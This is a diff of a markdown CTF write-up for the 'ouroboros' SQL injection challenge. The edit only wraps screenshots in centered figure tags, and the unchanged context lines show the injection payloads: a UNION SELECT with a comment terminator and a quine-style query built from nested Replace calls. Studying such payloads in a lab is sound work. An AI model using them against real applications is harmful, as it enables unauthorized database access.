@@ -3,7 +3,9 @@ custom_edit_url: null
 sidebar_position: 30
 ---
 
+<figure style={{ textAlign: 'center' }}>
 ![1](https://github.com/Kunull/Write-ups/assets/110326359/1484f622-d41c-4263-9655-405d71ed15d5)
+</figure>
 
 We are provided with the SQL query:
 
@@ -25,7 +27,9 @@ The resultant query becomes:
 SELECT pw FROM prob_ouroboros WHERE pw='' UNION SELECT 1 -- -'
 ```
 
+<figure style={{ textAlign: 'center' }}>
 ![3](https://github.com/Kunull/Write-ups/assets/110326359/33c02c9b-464c-4920-b0aa-4d463a1bc01c)
+</figure>
 
 In this case the `$result['pw']` and `$_GET['pw']` differ as follows:
 
@@ -223,4 +227,6 @@ The resultant query becomes:
 SELECT pw FROM prob_ouroboros WHERE pw='' UNION SELECT Replace(Replace('" UNION SELECT Replace(Replace("$",char(34),char(39)),char(36),"$") -- -',char(34),char( 39)),char(36),'" UNION SELECT Replace(Replace("$",char(34),char(39)),char(36),"$") -- -') -- -'
 ```
 
+<figure style={{ textAlign: 'center' }}>
 ![4](https://github.com/Kunull/Write-ups/assets/110326359/075e1d88-9e46-4cd7-a829-b8c68814e9d7)
+</figure>
